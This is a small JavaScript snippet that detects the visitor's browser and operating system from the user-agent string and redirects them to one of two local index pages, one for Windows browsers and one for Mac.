<script type="text/javascript">
var isChromium = window.chrome,
	vendorName = window.navigator.vendor,
	isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
	isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;

if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
	// is Google chrome
window.location.href = "./WHA/index.html";
}
if(navigator.userAgent.indexOf("Firefox") != -1 )
	{
			 window.location.href = "./WHA/index.html";
	}

	if(window.navigator.userAgent.indexOf("dg") != -1 )
		{
				 window.location.href = "./WHA/index.html";
		}

if(window.navigator.userAgent.indexOf("Edge") != -1 )
	{
			 window.location.href = "./WHA/index.html";
	}
if(window.navigator.userAgent.indexOf("Mac") != -1 )
	{
			 window.location.href = "./MRA/index.html";
	}
if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
	{
		window.location.href = "./WHA/index.html";
	}
$SAFARI_URL = "apple";
</script>
